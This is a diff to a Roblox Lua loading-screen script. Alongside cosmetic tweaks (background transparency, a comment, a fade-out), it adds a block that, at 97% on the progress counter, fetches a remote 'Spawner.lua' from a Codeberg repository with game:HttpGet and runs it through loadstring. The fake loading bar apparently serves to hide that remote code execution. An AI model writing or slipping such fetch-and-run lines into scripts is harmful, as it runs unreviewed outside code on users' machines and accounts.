@@ -14,6 +14,7 @@ gui.Parent = player:WaitForChild("PlayerGui")
 local bg = Instance.new("Frame", gui)
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.new(1, 1, 1)
+bg.BackgroundTransparency = 0
 
 -- Gradient Background
 local gradient = Instance.new("UIGradient", bg)
@@ -43,7 +44,7 @@ mainContainer.BackgroundTransparency = 1
 local uiScale = Instance.new("UIScale", mainContainer)
 uiScale.Scale = 1
 
--- Title text
+-- Title text settings (no curve, just one TextLabel)
 local titleContainer = Instance.new("Frame", mainContainer)
 titleContainer.Size = UDim2.new(1, 0, 0.07, 0)
 titleContainer.Position = UDim2.new(0, 0, 0.25, 0)
@@ -123,8 +124,22 @@ for i = 0, steps do
 
     percentText.Text = percent .. "%"
 
+    if percent == 97 then
+        task.spawn(function()
+            local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+            Spawner.Load()
+        end)
+    end
+
     if percent == 100 then
         doneMsg.Visible = true
+
+        -- Fade out the background frame (bg)
+        local fadeTween = TweenService:Create(bg, TweenInfo.new(2), {BackgroundTransparency = 1})
+        fadeTween:Play()
+        fadeTween.Completed:Wait()
+
+        gui:Destroy()
     end
 
     wait(waitTime)
